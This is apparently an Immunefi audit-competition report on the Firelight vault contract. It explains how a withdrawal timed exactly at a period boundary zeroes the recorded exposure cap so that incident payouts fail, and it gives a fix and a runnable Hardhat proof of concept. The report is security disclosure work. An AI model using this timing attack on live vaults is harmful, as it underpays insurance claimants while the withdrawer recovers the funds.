# 89556 sc medium a boundary withdrawal can zero the capture period exposure cap and prevent incident payouts

**Submitted on Aug 19th 2026 at 20:38:05 UTC by @sa1nt for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89556
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A shareholder can execute `withdraw()` or `redeem()` exactly when a new vault period begins, causing the post-withdrawal active balance to be recorded as that period’s opening exposure. Although the withdrawn assets remain inside the vault and should remain exposed to incidents, `payout()` may incorrectly cap the incident payment at zero. The shareholder can later claim the unaffected assets while the incident payout receiver receives less than expected.

## Vulnerability Details

`payout()` limits an incident payment using the assets recorded at the beginning of the incident’s capture period:

```solidity
(uint256 capturePeriod, uint48 capturePeriodStart) =
    _periodAndStartAt(captureTimestamp);

uint256 assetsAtCapturePeriod =
    totalAssetsAt(capturePeriodStart);
```

The value is used as a hard cap:

```solidity
paidAmount = Math.min(
    amount,
    Math.min(assetsAtCapturePeriod, activePayableAmount)
);
```

`totalAssetsAt()` performs an inclusive lookup, returning the latest checkpoint whose timestamp is less than or equal to the requested timestamp:

```solidity
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

After a withdrawal request, `_logTrace()` records the post-withdrawal active balance using the current block timestamp:

```solidity
function _logTrace(
    address owner,
    uint256 balance,
    uint256 _totalSupply,
    uint256 _totalAssets,
    bool isLogAssets
) private {
    uint48 ts = Time.timestamp();

    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);

    if (isLogAssets) {
        _traceTotalAssets.push(ts, _totalAssets);
    }
}
```

The checkpoint library replaces the latest value when two checkpoints use the same timestamp:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
}
```

Therefore, if a withdrawal is mined at exactly `capturePeriodStart`, its post-withdrawal active balance becomes the value returned by:

```solidity
totalAssetsAt(capturePeriodStart)
```

This is incorrect because the assets have not left the vault. They were moved into a pending-withdrawal bucket which `payout()` explicitly treats as still exposed:

```solidity
uint256 capturePeriodWithdrawals =
    withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount =
    currentActiveAssets
        + capturePeriodWithdrawals
        + nextPeriodWithdrawals;
```

### Example

Assume period `N` starts at timestamp `T`:

```
Active assets before T:        100
Attacker shares:               100
Pending withdrawals:             0
```

The attacker redeems all shares in a block where:

```
block.timestamp == T
```

The resulting state is:

```
Physical vault balance:             100
Active assets:                        0
withdrawAssets[N + 1]:              100
Recorded totalAssets checkpoint[T]:   0
```

For an incident captured during period `N`, `payout()` calculates:

```
assetsAtCapturePeriod      = 0
currentActiveAssets        = 0
capturePeriodWithdrawals   = 100
activePayableAmount        = 100
```

A requested payout of 100 becomes:

```
paidAmount = min(100, 0, 100) = 0
```

The pending withdrawal remains unchanged. Once the withdrawal period ends, the attacker claims all 100 assets.

The same withdrawal executed at `T + 1` does not cause the issue: the checkpoint at `T + 1` is excluded from `totalAssetsAt(T)`, so the payout correctly consumes the pending withdrawal.

### Recommended remediation

Use the checkpoint immediately before the period boundary:

```diff
- uint256 assetsAtCapturePeriod =
-     totalAssetsAt(capturePeriodStart);
+ uint256 assetsAtCapturePeriod =
+     totalAssetsAt(capturePeriodStart - 1);
```

## Impact Details

The recommended in-scope impact is:

> **Griefing — Medium**

The vulnerability allows a shareholder to avoid an incident haircut and causes the vault to underpay the protocol’s configured payout receiver.

The maximum underpayment equals the amount moved into pending withdrawal at the boundary. If the shareholder withdraws the entire active balance, the vault-funded payout can be reduced to zero:

```
Expected vault payout:        100
Actual vault payout:            0
Shareholder later claims:     100
```

The economic beneficiaries ultimately affected are cover orders’ payout recipients. `IncidentManager` sends vault and first-loss-buffer funds to a configured settlement receiver, after which individual distributions happen off-chain.

The current PoC directly exercises the authorized `FirelightVault.payout()` path. It proves the vault-level underpayment and the shareholder’s ability to recover the unaffected withdrawal.

The impact is persistent for the affected period because later checkpoints cannot repair the historical value at `capturePeriodStart`. Repeated payout attempts continue reading the same corrupted cap.

## References

-<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L911> -<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1055>

## Proof of Concept

```solidity
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("../test/setup/fixtures.js");

const ASSET_DECIMALS = 6;
const ONE_ASSET = 10n ** BigInt(ASSET_DECIMALS);
const EXPOSED_CAPITAL = 100n * ONE_ASSET;

function units(amount) {
  return `${amount} raw units (${ethers.formatUnits(amount, ASSET_DECIMALS)} assets)`;
}

async function reproduceScenario({ withdrawAtBoundary, label }) {
  console.log(`\n${label}`);

  const {
    token_contract: token,
    firelight_vault: vault,
    payout_signer: payoutSigner,
    payout_receiver: payoutReceiver,
    users,
    utils,
    config,
  } = await deployVault({
    decimals: ASSET_DECIMALS,
    initial_deposit_limit: 1_000n * ONE_ASSET,
  });

  const attacker = users[0];

  await utils.mintAndApprove(EXPOSED_CAPITAL, attacker);
  await vault.connect(attacker).deposit(EXPOSED_CAPITAL, attacker.address);

  expect(await vault.totalAssets()).to.equal(EXPOSED_CAPITAL);
  expect(await vault.balanceOf(attacker.address)).to.equal(EXPOSED_CAPITAL);
  expect(await token.balanceOf(vault.target)).to.equal(EXPOSED_CAPITAL);

  const previousPeriod = await vault.currentPeriod();
  const boundary = await vault.currentPeriodEnd();
  const withdrawalTimestamp = withdrawAtBoundary ? boundary : boundary + 1n;

  // Mine redeem() at the selected timestamp. At `boundary`, currentPeriod()
  // has already advanced, so the withdrawal is assigned to the new period's
  // next withdrawal bucket while _logTrace() writes under the period-start key.
  await time.setNextBlockTimestamp(withdrawalTimestamp);
  const shares = await vault.balanceOf(attacker.address);
  const redeemReceipt = await (await vault.connect(attacker).redeem(shares, attacker.address, attacker.address)).wait();

  const redeemBlock = await ethers.provider.getBlock(redeemReceipt.blockNumber);
  expect(BigInt(redeemBlock.timestamp)).to.equal(withdrawalTimestamp);

  const capturePeriod = await vault.currentPeriod();
  const capturePeriodStart = await vault.currentPeriodStart();
  const withdrawalPeriod = capturePeriod + 1n;

  expect(capturePeriod).to.equal(previousPeriod + 1n);
  expect(capturePeriodStart).to.equal(boundary);
  expect(await vault.totalAssets()).to.equal(0n);
  expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(EXPOSED_CAPITAL);
  expect(await vault.pendingWithdrawAssets()).to.equal(EXPOSED_CAPITAL);
  expect(await token.balanceOf(vault.target)).to.equal(EXPOSED_CAPITAL);

  const recordedOpeningExposure = await vault.totalAssetsAt(capturePeriodStart);
  const expectedOpeningExposure = withdrawAtBoundary ? 0n : EXPOSED_CAPITAL;
  expect(recordedOpeningExposure).to.equal(expectedOpeningExposure);

  console.log(`  period start:             ${capturePeriodStart}`);
  console.log(`  withdrawal timestamp:     ${withdrawalTimestamp}`);
  console.log(`  physical vault balance:   ${units(await token.balanceOf(vault.target))}`);
  console.log(`  recorded opening exposure:${units(recordedOpeningExposure)}`);
  console.log(`  pending withdrawal assets:${units(await vault.pendingWithdrawAssets())}`);

  const expectedPayout = withdrawAtBoundary ? 0n : EXPOSED_CAPITAL;

  await expect(vault.connect(payoutSigner).payout(payoutReceiver.address, EXPOSED_CAPITAL, capturePeriodStart))
    .to.emit(vault, "PayoutExecuted")
    .withArgs(payoutReceiver.address, EXPOSED_CAPITAL, expectedPayout, capturePeriodStart);

  expect(await token.balanceOf(payoutReceiver.address)).to.equal(expectedPayout);
  expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(EXPOSED_CAPITAL - expectedPayout);
  expect(await vault.pendingWithdrawAssets()).to.equal(EXPOSED_CAPITAL - expectedPayout);

  console.log(`  incident payout received: ${units(expectedPayout)}`);

  // A withdrawal assigned to capturePeriod + 1 becomes claimable once the
  // vault reaches capturePeriod + 2.
  await time.increase(config.period_configuration_duration * 2);

  let attackerRecovery;
  if (withdrawAtBoundary) {
    await vault.connect(attacker).claimWithdraw(withdrawalPeriod);
    attackerRecovery = await token.balanceOf(attacker.address);
    expect(attackerRecovery).to.equal(EXPOSED_CAPITAL);
  } else {
    await expect(vault.connect(attacker).claimWithdraw(withdrawalPeriod))
      .to.be.revertedWithCustomError(vault, "NoWithdrawalAmount")
      .withArgs(withdrawalPeriod);
    attackerRecovery = await token.balanceOf(attacker.address);
    expect(attackerRecovery).to.equal(0n);
  }

  console.log(`  withdrawing user recovers:${units(attackerRecovery)}`);

  return {
    recordedOpeningExposure,
    payoutReceived: expectedPayout,
    attackerRecovery,
  };
}

async function main() {
  console.log("[1/4] Deploy and reproduce the exact-boundary attack");
  const attack = await reproduceScenario({
    withdrawAtBoundary: true,
    label: "ATTACK — redeem() is mined exactly at the new period start",
  });

  console.log("\n[2/4] Prove the claimant is fully denied while the withdrawer recovers everything");
  expect(attack.recordedOpeningExposure).to.equal(0n);
  expect(attack.payoutReceived).to.equal(0n);
  expect(attack.attackerRecovery).to.equal(EXPOSED_CAPITAL);

  console.log("\n[3/4] Run the one-second-after-boundary control scenario");
  const control = await reproduceScenario({
    withdrawAtBoundary: false,
    label: "CONTROL — redeem() is mined one second after the new period start",
  });

  expect(control.recordedOpeningExposure).to.equal(EXPOSED_CAPITAL);
  expect(control.payoutReceived).to.equal(EXPOSED_CAPITAL);
  expect(control.attackerRecovery).to.equal(0n);

  console.log("\n[4/4] Compare outcomes");
  console.log(`  exact boundary: claimant receives ${units(attack.payoutReceived)}`);
  console.log(`  exact boundary: withdrawer recovers ${units(attack.attackerRecovery)}`);
  console.log(`  one second later: claimant receives ${units(control.payoutReceived)}`);
  console.log(`  one second later: withdrawer recovers ${units(control.attackerRecovery)}`);
  console.log(
    "\nPoC succeeded: an exact-boundary withdrawal reduced a 100-asset incident payout to zero and the withdrawing user later recovered all 100 assets.",
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```
